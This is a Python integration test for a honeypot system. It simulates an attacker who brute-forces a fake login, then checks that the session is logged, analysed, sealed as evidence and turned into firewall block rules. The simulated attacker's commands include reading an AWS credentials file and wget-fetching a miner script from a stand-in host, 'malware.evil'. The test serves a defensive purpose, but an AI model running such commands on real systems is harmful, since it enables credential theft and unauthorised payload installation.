"""End-to-end integration test of the Cloud Honeypot AI Shield."""

import socket
import time
import unittest

from cloud_honeypot_ai.ai.cloud_defense import CloudDefenseOptimizer
from cloud_honeypot_ai.ai.threat_analyzer import ThreatAnalyzer
from cloud_honeypot_ai.config import HoneypotConfig
from cloud_honeypot_ai.core.session import SessionManager
from cloud_honeypot_ai.core.tcp_honeypot import TCPHoneypotServer
from cloud_honeypot_ai.crypto.vault import ForensicCryptoVault


class TestEndToEndHoneypot(unittest.TestCase):

    def test_full_attack_detection_and_defense_pipeline(self):
        # 1. Setup isolated session manager, vault, and server
        session_mgr = SessionManager()
        test_port = 29555
        server = TCPHoneypotServer(
            host="127.0.0.1",
            port=test_port,
            session_mgr=session_mgr,
        )
        server.start()
        time.sleep(0.1)

        try:
            # 2. Attacker connects via TCP
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(3.0)
            client.connect(("127.0.0.1", test_port))

            # Initial banner & login prompt
            banner = ""
            while "login:" not in banner:
                chunk = client.recv(1024).decode("utf-8")
                if not chunk:
                    break
                banner += chunk
            self.assertIn("Ubuntu", banner)

            # Brute force: Attempt wrong password
            client.sendall(b"root\n")
            time.sleep(0.05)
            client.recv(512)
            client.sendall(b"wrongpass\n")
            time.sleep(0.1)
            fail_resp = client.recv(512).decode("utf-8")
            self.assertIn("Login incorrect", fail_resp)

            # Brute force: Attempt honey weak password "admin123"
            client.sendall(b"ubuntu\n")
            time.sleep(0.05)
            client.recv(512)
            client.sendall(b"admin123\n")
            time.sleep(0.1)
            succ_resp = client.recv(1024).decode("utf-8")
            self.assertIn("Login successful", succ_resp)

            # Execute commands
            commands_to_run = [
                "whoami\n",
                "uname -a\n",
                "cat /home/ubuntu/.aws/credentials\n",
                "wget http://malware.evil/miner.sh\n",
                "sudo su\n",
                "exit\n",
            ]
            for cmd in commands_to_run:
                client.sendall(cmd.encode("utf-8"))
                time.sleep(0.08)
                client.recv(2048)

            client.close()
            time.sleep(0.1)

            # 3. Verify session was recorded
            sessions = session_mgr.all_sessions()
            self.assertEqual(len(sessions), 1)
            session = sessions[0]

            self.assertTrue(session.authenticated)
            self.assertEqual(session.auth_user, "ubuntu")
            self.assertEqual(len(session.auth_attempts), 2)
            self.assertGreaterEqual(len(session.commands), 4)
            self.assertTrue(any("CANARY_AWS_CREDENTIAL_STOLEN" in alert for alert in session.canary_alerts))

            # 4. AI Threat Analysis
            analyzer = ThreatAnalyzer()
            threat_report = analyzer.analyze_session(session)

            self.assertEqual(threat_report.threat_level, "CRITICAL")
            self.assertGreaterEqual(threat_report.risk_score, 85)
            self.assertGreater(len(threat_report.mitre_techniques), 2)
            self.assertIn("CANARY_AWS_CREDENTIAL_STOLEN", threat_report.canary_breaches[0])

            # 5. Cryptographic Evidence Vault
            import tempfile
            from pathlib import Path
            temp_vault_dir = Path(tempfile.mkdtemp())
            vault = ForensicCryptoVault(vault_dir=temp_vault_dir)

            block = vault.seal_session(session.to_dict())
            self.assertEqual(block.block_index, 1)

            valid, _ = vault.verify_vault_integrity()
            self.assertTrue(valid)

            decrypted = vault.read_decrypted_session(session.session_id)
            self.assertEqual(decrypted["session_id"], session.session_id)
            self.assertEqual(decrypted["auth_user"], "ubuntu")

            # 6. Automated Cloud Defense Optimization
            defense = CloudDefenseOptimizer()
            defense.add_malicious_ip(session.remote_ip)  # In real scenario, remote IP
            # Add a demo public IP to test rule generation
            defense.add_malicious_ip("194.26.29.42")
            ruleset = defense.generate_defense_rules()

            self.assertEqual(len(ruleset.aws_nacl_cli), 1)
            self.assertIn("194.26.29.42", ruleset.aws_nacl_cli[0])
            self.assertGreater(ruleset.efficiency_metrics.bandwidth_saved_gb, 0.0)

        finally:
            server.stop()


if __name__ == "__main__":
    unittest.main()
